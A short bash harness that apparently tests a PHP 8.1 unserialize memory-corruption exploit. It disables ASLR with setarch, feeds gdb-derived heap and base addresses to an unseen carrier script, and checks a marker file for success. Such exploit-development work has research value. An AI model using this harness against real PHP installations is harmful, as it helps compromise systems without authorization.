#!/bin/bash
# Decisive test: rendered zero4 carrier under setarch -R (NO gdb) with the
# gdb-discovered CHUNK. If bool(false) -> no reclaim under setarch.
# If segv -> layout shifted. If marker -> sweep bug.
D=$(ls -dt /tmp/pwn_unserialize_* | head -1)
cd "$D" || exit 1
CHUNK=$((0x7ffff4cc2000))
BASE=$((0x555555400000))
CHUNK_DEC=$(printf "%016d" "$CHUNK")
BASE_DEC=$(printf "%016d" "$BASE")
echo "CHUNK=$CHUNK_DEC BASE=$BASE_DEC"
rm -f /tmp/.p2s_pwn
setarch x86_64 -R /usr/bin/php8.1 -n vdR3_call.php "$CHUNK_DEC" "$BASE_DEC"
echo "rc=$?"
echo "marker:"
cat /tmp/.p2s_pwn 2>/dev/null || echo "(none)"
